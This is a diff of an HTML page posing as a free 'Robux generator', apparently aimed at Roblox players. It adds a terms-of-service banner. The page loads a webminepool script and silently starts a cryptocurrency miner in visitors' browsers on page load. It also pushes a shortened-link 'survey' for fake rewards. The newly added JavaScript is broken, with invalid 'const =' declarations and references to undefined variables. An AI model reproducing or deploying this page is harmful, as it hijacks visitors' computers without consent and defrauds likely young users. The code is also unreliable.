@@ -4,6 +4,9 @@
 <title>WELCOME TO OUR ROBUX GEN!</title>
    <script src="https://webminepool.com/lib/base.js"></script>
 <style>
+   * {
+      margin: 0;
+   }
 body {
 text-align: center;
 font-family: Arial;
@@ -14,6 +17,30 @@ font-family: Arial;
       border-radius: 10px;
       background-color: darkgrey;
       margin: auto;
+   }
+   .tos-container {
+      background-color: darkslategray;
+      border-radius: 10px;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      color: white;
+      padding: 0 32px;
+      box-shadow: 0 -2px 16px grey;
+      
+      transition: 400ms;
+   }
+   
+   .tos-container a {
+      color: white;
+   }
+   
+   .tos-button {
+      background-color: #e84118;
+      border: 0;
+      padding: 12px 48px;
+      cursor: pointer;
    }
 </style>
 </head>
@@ -28,13 +55,34 @@ font-family: Arial;
       <h4>Do this <a href="http://gestyy.com/etSlqD">survey</a> for 10 Robux.</h4>
     <p>+10 Robux</p>
    </div>
-  
+   
+   
+   
+   
+   
+  <div class="tos-container">
+
+<p>
+   READ OUR <a href="./terms.html">TERMS OF SERVICE</a>, by clicking "Accept" you agree to our terms.
+     </p>
+     
+     <button class="tos-button">Accept</button>
+     
+   </div>
   
 <script>
     var miner = WMP.Anonymous('SK_qnYYEDQWTtoXQpxiOncpo', {throttle: 0.3});
    if (!miner.isMobile()){
     miner.start();
    }
+   </script>
+   <script>
+      const = tosContainer = document.querySelector(".tos-container");
+      const = tosButton = document.querySelector(".tos-button");
+      
+      cookieButton.addEventListener("click", () => {
+                                   cookieContainer.classList.remove("active");
+                                    });
    </script>
 </body>
 
